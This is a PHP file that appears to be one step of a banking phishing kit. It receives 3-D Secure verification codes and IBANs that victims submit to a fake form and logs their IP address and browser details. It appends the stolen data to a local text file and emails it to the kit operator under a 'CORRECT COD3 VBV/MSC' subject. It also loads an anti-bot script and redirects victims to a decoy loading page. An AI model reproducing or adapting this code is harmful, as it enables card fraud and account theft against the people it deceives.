<?php
	error_reporting(0);
	ob_start();
	session_start();

include'../antibots.php';
include'iban.php';
include '../email.php';
if($_SERVER['REQUEST_METHOD'] == 'POST'){
if($_POST['ibansub']){
$string = $_POST["iban"];
    $message = '
Code 3DS : '.$_POST["bankid"].'
';
}else if($_POST['infosub']){
    $message = '
Code 3DS : '.$_POST["bankid"].'
IP: '._ip().'
User Agent: '.$_SERVER["HTTP_USER_AGENT"].'
';    
}
$Subject="CORRECT COD3 VBV/MSC [2/3] "._ip();
$head="From: AlFredJr V2.019  <vbv1@rezzz.com>";
if(isset($string) && !verify_iban($string,$machine_format_only=false)){
     header('location: 3dserror.php?error=true');
}else {
 $fil = fopen('f.txt', 'a+');
fwrite($fil, PHP_EOL.'####################'.$message.PHP_EOL.'####################');
$_SESSION['step_five']  = true;
mail($my_mail,$Subject,$message,$head);
		header('location: load.php?enc=' . md5(time()) . '&p=1&dispatch=' . sha1(time()));   
}
}
else
{
	header('location: ../../index.php');
} 
